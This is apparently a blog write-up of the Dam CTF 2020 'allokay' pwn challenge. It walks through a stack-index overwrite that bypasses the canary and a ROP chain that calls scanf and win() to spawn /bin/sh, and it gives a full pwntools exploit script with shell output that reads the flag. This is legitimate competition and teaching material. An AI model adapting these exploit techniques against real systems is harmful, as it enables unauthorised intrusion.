---
layout: post
title: Dam CTF 2020 allokay (pwn)
---

Running checksec on the binary, we can see that many standard exploit mitigation technologies are present: stack canaries, non-executable stack, no RUNPATH. PIE is disabled, and the debugging symbols are still present.

## Initial dynamic analysis

The program asks for the number of favorite numbers the user has. Next, the user has to put in all of his favorite numbers. One noticable thing is that the program does not handle certain numbers well, for example, when the user has 10 favorite numbers,the program stops after 6 numbers.

<img src="{{ site.baseurl }}/images/allokay1.png"/>

## Initial Static analysis

Since the symbols are still present in the binary, loading the program into IDA gave us a clear overview of the execution flow and names of the functions. In a function called "get_input", the program gathers all of the user's favorite numbers. There is a stack cookie present in the function, so simply feeding a lot of data to overwrite the instruction pointer would be impossible.

## The "6 number" problem

As seen in the initial dynamic analysis, the program exits if more than 6 numbers are put into the program. This is because the value for the number of programs and the iterator are both stored on the stack, but the user's favorite numbers are stored on the stack too. Since the program does not dynamically create enough space on the stack depending on the amount of favorite numbers the user has, the numbers will overwrite both the iterator and the maximum amount of numbers. Since it overwrites the max numbers first, and since the number put in is very small, the numbers_max variable will be set to 0, and the loop condition is false. The loop will break, and the program will exit.

One interesting property of the "get_input" function is that the iterator determines where on the stack the input is being written.

<img src="{{ site.baseurl }}/images/allokay2.png"/>

Since we control the iterator, we control where the program writes the data put in by the user, and since we control the numbers_max variable, we control how many writes it will perform before leaving the loop. This way, we can bypass the stack cookie and overwrite the saved return address with the address of "win()". It is important to note that the user has to put in the attacker data in the form of integers, since the scanf() function that gets the data uses the format string "%ld". For example, if we want to call win(), we would need to get the address in hexadecimal and convert it to decimal.

## /bin/sh

Unfortunately, the win() function requires an argument: the path for execve() to execute. The argument needs to be stored in rdi, so we first need to build a ropchain that puts "/bin/sh" into rdi. The binary itself does not contain that string, and simply popping the /bin/sh string from libc would not work either, since the remote server has ASLR enabled. Therefore, the ropchain needs to make a call to some function that gets input from the user and stores it somewhere the attacker intended.

The first function I considered was fgets(), since we could easily put in the literal string "/bin/sh" into stdin, and store it wherever we want. Unfortunately, there is no rop gadget that controls the rdx register, which is the third argument for the fgets() function. Instead, scanf() can be used to write the arbitrary data. One thing to note is that there is no "%s" format string in the binary, so we have to reuse the "%ld" string. This means that we need to put in the "/bin/sh" string in an integer format by converting the string to decimal with the ASCII table. For the write location of the "/bin/sh" string, I choose the .bss segment.

We now have enough information to build an exploit script and carry out an attack.

```python
#!/bin/python3

from pwn import *

numbers_max_overwrite = b'85899345931'
iterator_overwrite = b'42949672971'
poprdi = b'4196659'
ld = b'4196717'
poprsi_popr15 = b'4196657'
binsh_location = b'6295680'
scanf = b'4195936'
win = b'4196199'
binsh = b'29400045130965551'

r = remote('chals.damctf.xyz', 32575)

r.recvuntil(b'How many favorite numbers do you have?\n')
r.sendline(b'10')

for x in range(5):
    r.recvuntil(b': ')
    r.sendline(b'2')

r.recvuntil(b': ')
r.sendline(numbers_max_overwrite)
r.recvuntil(b': ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(iterator_overwrite)
r.recvuntil(b': ')
r.sendline(poprdi)
r.recvuntil(b': ')
r.sendline(ld)
r.recvuntil(b': ')
r.sendline(poprsi_popr15)
r.recvuntil(b': ')
r.sendline(binsh_location)
r.recvuntil(b': ')
r.sendline(b'2')
r.recvuntil(b': ')
r.sendline(scanf)
r.recvuntil(b': ')
r.sendline(poprdi)
r.recvuntil(b': ')
r.sendline(binsh_location)
r.recvuntil(b': ')
r.sendline(win)
r.sendline(binsh)

r.interactive()
```

Script output:
```console
[+] Opening connection to chals.damctf.xyz on port 32575: Done
[*] Switching to interactive mode
$ ls
allokay
flag
$ cat flag
dam{4Re_u_A11_0cK4y}
```
